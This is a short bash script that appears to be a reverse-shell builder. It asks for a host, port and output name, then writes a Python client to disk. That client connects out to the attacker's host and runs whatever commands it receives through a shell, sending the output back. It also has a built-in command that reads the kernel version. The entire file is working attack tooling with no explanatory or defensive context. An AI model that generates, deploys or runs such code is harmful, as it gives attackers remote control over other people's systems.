#!/bin/bash

echo -en "enter host \e[92m?\e[0m "
read host
echo -en "enter port \e[92m?\e[0m "
read port
echo -en "enter name \e[92m?\e[0m "
read name

echo "
import socket
import subprocess
import os

s = socket.socket()
s.connect(('$host', $port))

while True:
    cmd = s.recv(1024)
    if cmd[:2] == 'cd':
     os.chdir(cmd[3:])
     dir = os.getcwd()
     s.sendall('bacod')
    elif cmd == 'kernel_info':
     results = subprocess.Popen('cat /proc/version', shell=True,
               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
               stdin=subprocess.PIPE)
     results = results.stdout.read() + results.stderr.read()

     s.sendall(results)

    else:
     results = subprocess.Popen(cmd, shell=True,
               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
               stdin=subprocess.PIPE)
     results = results.stdout.read() + results.stderr.read()

     s.sendall('\n'+results)
" > ../$name
